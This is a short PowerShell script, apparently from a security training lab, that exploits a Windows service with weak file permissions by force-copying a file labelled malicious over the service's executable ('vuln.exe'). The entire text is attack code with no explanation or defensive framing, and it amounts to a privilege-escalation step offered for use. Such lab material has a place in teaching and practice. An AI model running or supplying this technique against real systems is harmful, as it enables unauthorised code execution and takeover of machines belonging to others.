$maliciousPath = "C:\Script\script.exe"
$executablePath = "C:\Windows Files\MCSI\vuln.exe"

# Exploit an insecure service by replacing it with a malicious service
try {
    Write-Host "Replacing vulnerable service with a malicious one"
    Copy-Item -Path $maliciousPath -Destination $executablePath -Force
}
catch {
    Write-Host "Errors occurred during the replacement"
}
